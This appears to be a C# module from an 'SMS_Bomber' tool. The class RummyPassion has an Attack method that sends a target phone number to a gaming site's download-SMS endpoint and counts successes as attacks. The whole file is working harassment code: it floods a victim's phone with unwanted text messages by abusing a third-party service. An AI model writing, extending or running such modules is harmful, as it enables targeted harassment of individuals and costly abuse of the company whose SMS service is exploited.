using System.Net.Http;
using System.Threading.Tasks;

namespace SMS_Bomber.Sender
{
    public class RummyPassion : ISender
    {
        public int Failed { get; set; }
        public int Attacked { get; set; }
        public int TotalRequest { get; set; }
        public string Provider => "RummyPassion";
        private readonly HttpClient Attacker = new HttpClient();

        public async Task<bool> Attack(long To, bool Retry = false)
        {
            TotalRequest++;
            var AtkMSG = new HttpRequestMessage(HttpMethod.Get,
                $"https://www.rummypassion.com/index.php?option=com_download&task=download.sendDownloadSMS&mobile={To}");

            try
            {
                var AtkRES = await (await Attacker.SendAsync(AtkMSG)).Content.ReadAsStringAsync();
                if (AtkRES.Contains("\"status\":\"success\"")) { Attacked++; return true; }
            }
            catch { }

            Failed++;
            return false;
        }
    }
}
